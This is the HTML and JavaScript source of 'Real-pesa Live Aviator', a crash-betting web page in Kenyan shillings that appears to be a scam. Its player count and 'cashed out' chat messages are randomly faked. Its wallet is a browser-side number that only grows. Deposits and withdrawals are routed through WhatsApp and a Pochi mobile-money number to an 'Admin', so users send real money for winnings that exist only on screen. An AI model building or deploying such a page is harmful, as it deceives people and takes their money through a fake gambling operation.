<!DOCTYPE html><html><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1.0">
<title>Real-pesa | Live Pro</title><style>
:root{--p:#1b5e20;--m:#4caf50;--d:#121212;--r:#ff4444;}body{font-family:sans-serif;margin:0;background:#000;color:#fff;text-align:center;overflow-x:hidden;}
header{background:var(--p);padding:15px;font-weight:bold;}.live-n{font-size:0.7rem;color:#fbc02d;margin-top:5px;}
.hist{background:#1a1a1a;padding:8px;display:flex;justify-content:center;gap:5px;font-size:0.7rem;border-bottom:1px solid #333;}
.h-item{background:#333;padding:3px 8px;border-radius:10px;color:var(--m);}.game{background:var(--d);margin:10px;height:140px;border-radius:10px;border:2px solid #333;display:flex;flex-direction:column;justify-content:center;}
#mult{font-size:3.5rem;font-weight:bold; transition:0.1s;}.ctrl{padding:15px;background:#1a1a1a;margin:10px;border-radius:15px;}
input{width:90%;padding:10px;margin:5px 0;border-radius:8px;border:none;background:#222;color:#fff;}
.btn{width:95%;padding:15px;border:none;border-radius:10px;font-weight:bold;font-size:1.1rem;cursor:pointer;margin-bottom:10px;}
.bet{background:var(--m);color:#fff;}.cash{background:#fbc02d;color:#000;}.wd-btn{background:#25d366;color:#fff;}.dep-btn{background:var(--p);color:#fff;}
.auto-sec{margin:10px 0;font-size:0.8rem;display:flex;justify-content:center;gap:8px;}
.chat{margin:10px;background:#111;border-radius:10px;height:100px;display:flex;flex-direction:column;}
#msgs{flex-grow:1;padding:10px;font-size:0.75rem;text-align:left;overflow-y:auto;color:#bbb;}.win{color:#fbc02d;font-style:italic;}
</style></head><body>
<header>Real-pesa Live Aviator <div class="live-n">● <span id="online">142</span> Players Online</div></header>
<div class="hist" id="hist"><span>History:</span></div>
<div class="game"><div id="mult">1.00x</div><div id="stat" style="color:#888;">Starting...</div></div>
<div class="ctrl">
    <div>Wallet: <span id="bal">KES 0.00</span></div>
    <input type="number" id="amt" placeholder="Bet Amount">
    <div class="auto-sec">
        <span>Auto:</span><input type="number" id="auto-val" placeholder="2.00" style="width:50px;margin:0;">
        <label><input type="checkbox" id="auto-bet"> Auto Bet</label>
    </div>
    <button id="btn" class="btn bet" onclick="action()">PLACE BET</button>
    <button class="btn dep-btn" onclick="deposit()">DEPOSIT (POCHI)</button>
    <button class="btn wd-btn" onclick="withdraw()">WITHDRAW</button>
</div>
<div class="chat"><div id="msgs"><div class="msg"><b>System:</b> Deposit via Pochi: 0797097831</div></div></div>
<footer style="font-size:0.7rem;color:#888;padding-bottom:10px;">Pochi: 0797097831</footer>
<script>
let m=1.0, isFlying=false, myBet=0, h=[], iv, wallet=0;
const x=document.getElementById('mult'), s=document.getElementById('stat'), b=document.getElementById('btn'), ms=document.getElementById('msgs'), bl=document.getElementById('bal');
function addH(v){h.unshift(v);if(h.length>5)h.pop();let html='<span>History:</span>';h.forEach(i=>{html+=`<span class="h-item">${i}x</span>`});document.getElementById('hist').innerHTML=html;}
function loop(){
    isFlying=true; m=1.0; x.style.color="#fff"; s.innerText="Flying...";
    if(document.getElementById('auto-bet').checked && myBet===0){ action(); }
    let crash=Math.random()*6+1.1;
    iv=setInterval(()=>{
        m+=0.01; x.innerText=m.toFixed(2)+"x";
        let autoAt = parseFloat(document.getElementById('auto-val').value);
        if(myBet>0 && autoAt > 0 && m >= autoAt){ cashOut(); }
        if(Math.random()>0.98){ ms.innerHTML+=`<div class="win">User_${Math.floor(Math.random()*999)} cashed out at ${m.toFixed(2)}x</div>`; ms.scrollTop=ms.scrollHeight; }
        if(m>=crash){ clearInterval(iv); isFlying=false; addH(m.toFixed(2));
            x.innerText="FLEW AWAY!"; x.style.color="var(--r)"; s.innerText="Waiting...";
            if(myBet>0){ b.innerText="PLACE BET"; b.className="btn bet"; myBet=0; }
            setTimeout(loop, 3000);
        }
    },100);
}
function action(){
    if(myBet===0 && isFlying && m < 1.15){
        myBet=document.getElementById('amt').value||10; b.innerText="CASH OUT"; b.className="btn cash";
    } else if(myBet>0 && isFlying){ cashOut(); }
}
function cashOut(){
    let win = (myBet * m); wallet += win; bl.innerText = "KES " + wallet.toFixed(2);
    alert("Won KES "+win.toFixed(2)); b.innerText="PLACE BET"; b.className="btn bet"; myBet=0;
}
function deposit(){
    window.location.href = `https://wa.me/254797097831?text=${encodeURIComponent("Hello Admin, I want to deposit KES. Send me the Pochi details.")}`;
}
function withdraw(){
    window.location.href = `https://wa.me/254797097831?text=${encodeURIComponent("Hello Admin, I want to withdraw KES " + wallet.toFixed(2) + " from Real-pesa.")}`;
}
setInterval(()=>{document.getElementById('online').innerText=Math.floor(Math.random()*20+130);},5000);
loop();
</script></body></html>
